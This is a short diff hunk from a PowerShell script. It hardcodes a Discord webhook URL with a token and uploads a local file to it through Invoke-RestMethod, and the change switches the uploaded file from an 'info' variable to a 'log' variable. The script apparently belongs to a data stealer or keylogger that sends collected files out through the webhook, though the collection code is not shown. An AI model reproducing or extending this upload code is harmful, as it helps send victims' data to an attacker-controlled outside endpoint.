@@ -62,5 +62,5 @@ function Submit-TextFile($filePath,$Uri){
     Invoke-RestMethod @params
 }
 $Uri = 'https://discord.com/api/webhooks/838597970369708123/f95KX4IkB4qbt10eMdiW9SMyBEf_5uMPsr2vwXtoxNmE6OG4B0fFGM_KUesDb8wOTEJQ'
-$filePath = (Get-Item $scstinfo).FullName
+$filePath = (Get-Item $scstlog).FullName
 Submit-TextFile $filePath $Uri
